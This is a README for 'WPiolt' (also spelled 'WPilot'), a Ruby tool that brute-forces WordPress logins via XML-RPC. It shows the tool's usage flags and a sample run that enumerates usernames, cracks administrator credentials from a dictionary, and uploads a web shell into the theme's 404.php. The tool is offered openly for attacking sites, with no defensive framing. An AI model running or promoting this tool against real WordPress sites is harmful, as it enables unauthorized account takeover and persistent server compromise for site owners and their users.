#WPiolt

================================================================================================

WPiolt - Wordpress Bruteforce tool via XML-RPC. The basic version only provides limited functionalities.


Developer : Andy Yang
Version : 0.1.0
License : GPLv3

================================================================================================
RainMak3r@Could:~/Desktop# ruby WPiolt.rb  -h

EXAMPLE USAGE:

     ./WPilot.rb  -t 'www.target.com' -d '/User/eve/dic.txt'
     ./WPilot.rb  -t '10.0.0.1/wordpress' -d '/User/eve/dic.txt'
    -t, --Target URL/IP              Wordpress target URL or IP
    -d, --Dictionary path            Dictionary file for password Bruteforce.
    -h, --help                       Display help

================================================================================================
Example of usage.
================================================================================================
RainMak3r@Could:~/Desktop#ruby WPilot.rb -t '192.168.0.11/wordpress' -d '/dic'

[Info]     Checking if the target is vulnerable........

[Info]     Target is vulnerable!!!

[Info]     Retreving usernames........

[Info]      Found username: admin

[Info]      Found username: Alice

[Info]      Found username: Bob

[Info]      Bruteforcing passwords ........

[Info]      Cracked Admin Creds: andy:1234567

[Info]      Uploading shell into 404.php..........

[DONE]      Please check a non existing post for the uploaded web shell


